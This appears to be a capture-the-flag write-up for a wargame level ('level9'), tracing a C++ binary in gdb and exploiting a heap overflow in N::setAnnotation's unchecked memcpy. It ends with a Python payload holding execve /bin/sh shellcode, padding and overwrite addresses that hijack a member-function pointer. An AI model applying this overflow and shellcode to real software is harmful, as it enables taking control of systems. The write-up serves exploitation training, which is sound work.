@@ -1,0 +1,54 @@
+#> ldd level9
+libstdc++.so.6 => [...]
+
+It's c++ !
+
+#> nm -nr --demangle level9 | grep W     -> W for weak symbols (member functions)
+0804874e W N::operator-(N&)
+0804873a W N::operator+(N&)
+0804870e W N::setAnnotation(char*)
+080486f6 W N::N(int)
+080486f6 W N::N(int)
+
+(gdb) set print asm-demangle on
+new N(5), new N(6)
+Class N attributes: N is 0x6c big.
+It has a pointer to member function operator+ - 0x04
+A buffer - 0x64
+An interger - 0x04
+
+N::setAnnotation calls memcpy(buffer, argv[1], strlen(argv[1]))
+
+The binary allocates 2 N objects with new.
+Calls setannotation on the first one.
+Then calls the second one's member-function pointer.
+
+To get the heap addresses:
+(gdb) b *main+136            # After N::setAnnotation
+(gdb) x/x $esp
+result
+(gdb) x/56wx result
+
+Without HoF the second N's fun-ptr points to somewhere in
+the .eh_frame_hdr section of the binary.
+It's the Error Handling Frame Header.
+It contains error handling information, pointers to error handlers,
+and a search table of pointers to the eh_frame records.
+
+I don't know why but the address contained there for the fun-ptr
+points back in the .text section.
+Nevertheless the mechanism is the same if we want to HoF successfuly.
+We have to enter an address containing an address to our shellcode.
+
+This can be done :
+pointer + shellcode + offset + address_of_pointer
+
+# kali_pointer = "\x78\xeb\x04\x08";
+pointer = "\x10\xa0\x04\x08";
+shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+offset = "A"*0x50;
+# kali_address = "\x74\xeb\x04\x08";
+address = "\x0c\xa0\x04\x08";
+print pointer + shellcode + offset + address;
+
+#> ./level9 $(python HoF.cpp.py)
